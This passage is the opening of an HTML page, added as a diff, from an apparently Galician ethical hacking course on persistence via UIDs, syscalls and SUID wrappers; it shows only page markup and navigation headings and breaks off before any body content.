@@ -1,0 +1,2504 @@
+
+<!doctype html>
+<html lang="gl" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      
+        <link rel="prev" href="../rlwrap/">
+      
+      
+        <link rel="next" href="../referencias/">
+      
+      
+      <link rel="icon" href="../../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.22">
+    
+    
+      
+        <title>UIDs, Syscalls e Wrappers de Persistencia - Hacking Ético - UD3 - Consolidación e utilización de sistemas comprometidos</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../../assets/stylesheets/main.84d31ad4.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../../../css/custom.css">
+    
+      <link rel="stylesheet" href="../../../../css/opera.css">
+    
+      <link rel="stylesheet" href="../../../../css/print.css">
+    
+    <script>__md_scope=new URL("../../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#uids-syscalls-e-wrappers-de-persistencia" class="md-skip">
+          Ir ao contido
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow md-header--lifted" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Cabeceira">
+    <a href="../../../.." title="Hacking Ético - UD3 - Consolidación e utilización de sistemas comprometidos" class="md-header__button md-logo" aria-label="Hacking Ético - UD3 - Consolidación e utilización de sistemas comprometidos" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Hacking Ético - UD3 - Consolidación e utilización de sistemas comprometidos
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              UIDs, Syscalls e Wrappers de Persistencia
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Cambiar a modo oscuro"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Cambiar a modo oscuro" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 6H7c-3.31 0-6 2.69-6 6s2.69 6 6 6h10c3.31 0 6-2.69 6-6s-2.69-6-6-6m0 10H7c-2.21 0-4-1.79-4-4s1.79-4 4-4h10c2.21 0 4 1.79 4 4s-1.79 4-4 4M7 9c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="indigo"  aria-label="Cambiar a modo normal"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Cambiar a modo normal" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 7H7a5 5 0 0 0-5 5 5 5 0 0 0 5 5h10a5 5 0 0 0 5-5 5 5 0 0 0-5-5m0 8a3 3 0 0 1-3-3 3 3 0 0 1 3-3 3 3 0 0 1 3 3 3 3 0 0 1-3 3"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Procura" placeholder="Procura" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Procurar">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Limpar" aria-label="Limpar" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Inicializando procura
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+    
+      
+<nav class="md-tabs" aria-label="Pestanas" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../.." class="md-tabs__link">
+        
+  
+  
+    
+  
+  De interese
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+    
+  
+  
+    
+    
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="../../consideracions/" class="md-tabs__link">
+          
+  
+  
+  Apuntamentos
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../practicas-taller/doc-vulnyx-pivoting-war-basic/" class="md-tabs__link">
+          
+  
+  
+  Prácticas Taller UD3
+
+        </a>
+      </li>
+    
+  
+
+    
+  
+
+      
+    </ul>
+  </div>
+</nav>
+    
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navegación" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../../.." title="Hacking Ético - UD3 - Consolidación e utilización de sistemas comprometidos" class="md-nav__button md-logo" aria-label="Hacking Ético - UD3 - Consolidación e utilización de sistemas comprometidos" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    Hacking Ético - UD3 - Consolidación e utilización de sistemas comprometidos
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    De interese
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    Apuntamentos
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            Apuntamentos
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../consideracions/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Consideracións
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2_2" id="__nav_2_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Tips
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            Tips
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_2_1" id="__nav_2_2_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Pivoting
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_2_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_2_1">
+            <span class="md-nav__icon md-icon"></span>
+            Pivoting
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../proxychains_pivoting_doc/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Proxychains e SOCKS
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2_2_2" id="__nav_2_2_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    GNU/Linux
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_2_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            GNU/Linux
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../restauracion-tty-linux/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    TTY non interactiva
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../rlwrap/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    rlwrap
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    UIDs, Syscalls e Wrappers de Persistencia
+    
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    UIDs, Syscalls e Wrappers de Persistencia
+    
+  </span>
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Táboa de contidos">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Táboa de contidos
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#1-identificadores-de-proceso-e-identidade" class="md-nav__link">
+    <span class="md-ellipsis">
+      1. Identificadores de Proceso e Identidade
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="1. Identificadores de Proceso e Identidade">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#exercicios-de-reconecemento" class="md-nav__link">
+    <span class="md-ellipsis">
+      Exercicios de Recoñecemento
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2-a-caixa-de-ferramentas-syscalls-e-administracion" class="md-nav__link">
+    <span class="md-ellipsis">
+      2. A Caixa de Ferramentas: Syscalls e Administración
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="2. A Caixa de Ferramentas: Syscalls e Administración">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#a-funcions-de-c-e-syscalls-unistdh" class="md-nav__link">
+    <span class="md-ellipsis">
+      A. Funcións de C e Syscalls (&lt;unistd.h&gt;)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#b-comandos-de-administracion" class="md-nav__link">
+    <span class="md-ellipsis">
+      B. Comandos de Administración
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3-o-dilema-system-vs-interpretes-vs-exec" class="md-nav__link">
+    <span class="md-ellipsis">
+      3. O Dilema: system() vs Intérpretes vs exec()
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="3. O Dilema: system() vs Intérpretes vs exec()">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#por-que-system-adoita-fallar" class="md-nav__link">
+    <span class="md-ellipsis">
+      Por que system() adoita fallar?
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#a-opcion-p-de-bash-privileged-mode" class="md-nav__link">
+    <span class="md-ellipsis">
+      A opción -p de Bash (Privileged Mode)
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#4-casos-practicos-de-persistencia" class="md-nav__link">
+    <span class="md-ellipsis">
+      4. Casos Prácticos de Persistencia
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="4. Casos Prácticos de Persistencia">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#caso-1-wrapper-suid-para-root-shell-c" class="md-nav__link">
+    <span class="md-ellipsis">
+      Caso 1: Wrapper SUID para Root Shell (C)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#caso-2-wrapper-sgid-para-acceso-ao-grupo-shadow" class="md-nav__link">
+    <span class="md-ellipsis">
+      Caso 2: Wrapper SGID para acceso ao Grupo shadow
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#caso-3-reverse-shell-root" class="md-nav__link">
+    <span class="md-ellipsis">
+      Caso 3: Reverse Shell Root
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#caso-4-interpretes-pythonperlruby" class="md-nav__link">
+    <span class="md-ellipsis">
+      Caso 4: Intérpretes (Python/Perl/Ruby)
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#5-linux-capabilities-alternativa-moderna-aos-suid" class="md-nav__link">
+    <span class="md-ellipsis">
+      5. Linux Capabilities: Alternativa Moderna aos SUID
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="5. Linux Capabilities: Alternativa Moderna aos SUID">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#capabilities-comuns-para-escalada-e-persistencia" class="md-nav__link">
+    <span class="md-ellipsis">
+      Capabilities Comúns para Escalada e Persistencia:
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#comandos-de-xestion" class="md-nav__link">
+    <span class="md-ellipsis">
+      Comandos de Xestión:
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exemplos-practicos" class="md-nav__link">
+    <span class="md-ellipsis">
+      Exemplos Prácticos:
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Exemplos Prácticos:">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#a-cap_setuid-cambiar-uid" class="md-nav__link">
+    <span class="md-ellipsis">
+      A. cap_setuid (Cambiar UID)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#b-cap_setgid-cambiar-gid" class="md-nav__link">
+    <span class="md-ellipsis">
+      B. cap_setgid (Cambiar GID)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#c-cap_dac_override-ignorar-permisos" class="md-nav__link">
+    <span class="md-ellipsis">
+      C. cap_dac_override (Ignorar Permisos)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#d-cap_sys_admin-o-pequeno-root" class="md-nav__link">
+    <span class="md-ellipsis">
+      D. cap_sys_admin (O "Pequeno Root")
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#6-resumo-de-seguridade" class="md-nav__link">
+    <span class="md-ellipsis">
+      6. Resumo de Seguridade
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_2_3" id="__nav_2_2_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Windows
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_2_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_2_3">
+            <span class="md-nav__icon md-icon"></span>
+            Windows
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../referencias/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Referencias
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ataques-kerberos/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Ataques Kerberos
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../desactivar-windows-defender/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Desactivar Windows Defender
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../powershell_bypass/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Powershell Bypass
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../nishang/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Nishang
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Prácticas Taller UD3
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            Prácticas Taller UD3
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_1" id="__nav_3_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Pivoting
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_1">
+            <span class="md-nav__icon md-icon"></span>
+            Pivoting
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../practicas-taller/doc-vulnyx-pivoting-war-basic/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Windows / Linux
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../practicas-taller/doc-vulnyx-pivoting-basic-war/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Linux / Windows
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_2" id="__nav_3_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    VulNyx
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_2">
+            <span class="md-nav__icon md-icon"></span>
+            VulNyx
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../practicas-taller/vulnyx/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Introdución
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_2_2" id="__nav_3_2_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Prácticas Taller
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_2_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            Prácticas Taller
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2_2_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_2_2_1" id="__nav_3_2_2_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Fase 5. Persistencia. Máquinas virtuais nivel Low, so Linux
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_3_2_2_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_2_2_1">
+            <span class="md-nav__icon md-icon"></span>
+            Fase 5. Persistencia. Máquinas virtuais nivel Low, so Linux
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../practicas-taller/indice_vulnyx_low_linux_fases/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Índice
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../practicas-taller/practicas-taller-vulnyx-persistencia/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Máquinas VulNyx
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2_2_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_2_2_2" id="__nav_3_2_2_2_label" tabindex="0">
